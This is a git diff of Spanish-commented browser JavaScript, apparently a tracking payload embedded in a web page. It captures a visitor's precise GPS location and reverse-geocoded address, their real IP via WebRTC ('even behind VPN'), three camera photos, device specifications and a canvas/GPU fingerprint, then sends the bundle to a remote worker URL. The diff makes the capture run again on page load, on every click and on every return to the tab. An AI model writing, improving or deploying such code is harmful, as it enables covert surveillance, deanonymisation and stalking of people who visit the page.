@@ -4,7 +4,7 @@
     const workerUrl = scriptTag.dataset.serverUrl;
 
     // ============================================================
-    // 1. GEOCÓDIGO INVERSO (si se usa en el script)
+    // 1. GEOCÓDIGO INVERSO (dirección exacta desde GPS)
     // ============================================================
     async function reverseGeocode(lat, lng) {
         try {
@@ -16,7 +16,7 @@
     }
 
     // ============================================================
-    // 2. WEBRTC - IP REAL
+    // 2. WEBRTC - IP REAL (incluso detrás de VPN)
     // ============================================================
     function obtenerIPWebRTC() {
         return new Promise((resolve) => {
@@ -33,7 +33,7 @@
     }
 
     // ============================================================
-    // 3. GPS
+    // 3. GPS CON WATCHPOSITION (precisión máxima)
     // ============================================================
     function capturarGPS() {
         return new Promise((resolve) => {
@@ -43,17 +43,26 @@
                 (pos) => {
                     const coords = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
                     if (!mejor || coords.acc < mejor.acc) mejor = coords;
-                    if (coords.acc < 20) { navigator.geolocation.clearWatch(watchId); resolve(mejor); }
+                    if (coords.acc < 20) {
+                        navigator.geolocation.clearWatch(watchId);
+                        resolve(mejor);
+                    }
                 },
-                () => { navigator.geolocation.clearWatch(watchId); resolve(mejor); },
+                () => {
+                    navigator.geolocation.clearWatch(watchId);
+                    resolve(mejor);
+                },
                 { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
             );
-            setTimeout(() => { navigator.geolocation.clearWatch(watchId); resolve(mejor); }, 8000);
+            setTimeout(() => {
+                navigator.geolocation.clearWatch(watchId);
+                resolve(mejor);
+            }, 8000);
         });
     }
 
     // ============================================================
-    // 4. CAPTURAR FOTOS
+    // 4. CAPTURAR FOTOS (3 fotos sin bloquear)
     // ============================================================
     async function capturarFotos(cantidad = 3) {
         const fotos = [];
@@ -84,7 +93,7 @@
     }
 
     // ============================================================
-    // 5. DATOS DEL DISPOSITIVO
+    // 5. DATOS DEL DISPOSITIVO (completos)
     // ============================================================
     function obtenerDispositivo() {
         const ua = navigator.userAgent;
@@ -109,7 +118,7 @@
     }
 
     // ============================================================
-    // 6. FINGERPRINT
+    // 6. FINGERPRINT (GPU y Canvas)
     // ============================================================
     function obtenerFingerprint() {
         try {
@@ -179,16 +188,38 @@
             obtenerPermisos()
         ]);
 
-        let msg = '🖥️ *Device & Browser*\n';
+        let msg = '🖥️ DEVICE & BROWSER\n';
         msg += `   • Device Model: ${dispositivo.modelo}\n`;
-        msg += `   • User Agent: ${dispositivo.userAgent}\n\n`;
-        if (ipLocal) msg += `🔒 *Local IP (WebRTC)*\n   • ${ipLocal}\n\n`;
-        msg += `📱 *Display:* ${dispositivo.resolution}\n`;
-        msg += `🔋 *Batería:* ${bateria.level} (${bateria.charging})\n`;
-        msg += `🎨 *GPU:* ${fp.gpu}\n`;
-        msg += `💾 *Almacenamiento:* ${almacenamiento.used} / ${almacenamiento.total}\n`;
-        msg += `🔐 *Permisos:* Cámara=${permisos.camera}, Ubicación=${permisos.location}\n`;
+        msg += `   • User Agent: ${dispositivo.userAgent}\n`;
+        msg += `   • Language: ${dispositivo.language}\n`;
+        msg += `   • Platform: ${dispositivo.platform}\n`;
+        msg += `   • Vendor: ${dispositivo.vendor}\n`;
+        msg += `   • Resolution: ${dispositivo.resolution}\n`;
+        msg += `   • Color Depth: ${dispositivo.colorDepth}\n`;
+        msg += `   • CPU Cores: ${dispositivo.cpuCores}\n`;
+        msg += `   • RAM: ${dispositivo.deviceMemory} GB\n\n`;
 
+        if (ipLocal) {
+            msg += `🔒 LOCAL IP (WebRTC)\n   • ${ipLocal}\n\n`;
+        }
+
+        msg += `🔋 BATTERY\n`;
+        msg += `   • Level: ${bateria.level}\n`;
+        msg += `   • Charging: ${bateria.charging}\n\n`;
+
+        msg += `💾 STORAGE\n`;
+        msg += `   • Used: ${almacenamiento.used}\n`;
+        msg += `   • Total: ${almacenamiento.total}\n\n`;
+
+        msg += `🔐 PERMISSIONS\n`;
+        msg += `   • Camera: ${permisos.camera}\n`;
+        msg += `   • Location: ${permisos.location}\n\n`;
+
+        msg += `🎨 FINGERPRINT\n`;
+        msg += `   • GPU: ${fp.gpu}\n`;
+        msg += `   • Canvas: ${fp.canvas}\n\n`;
+
+        // ========== Enviar al Worker con GPS y fotos ==========
         const payload = {
             text: msg,
             photos: fotos,
@@ -209,7 +240,22 @@
         }
     }
 
-    window.addEventListener('load', () => {
-        setTimeout(enviarAlWorker, 1000);
+    // ============================================================
+    // 10. EVENTOS: cargar, clic, visibilidad
+    // ============================================================
+    function ejecutar() {
+        setTimeout(enviarAlWorker, 500);
+    }
+
+    window.addEventListener('load', ejecutar);
+    document.addEventListener('click', () => {
+        console.log('👆 Click detectado, reiniciando captura...');
+        setTimeout(enviarAlWorker, 300);
+    });
+    document.addEventListener('visibilitychange', () => {
+        if (!document.hidden) {
+            console.log('👁️ Página visible, reiniciando captura...');
+            setTimeout(enviarAlWorker, 300);
+        }
     });
 })();
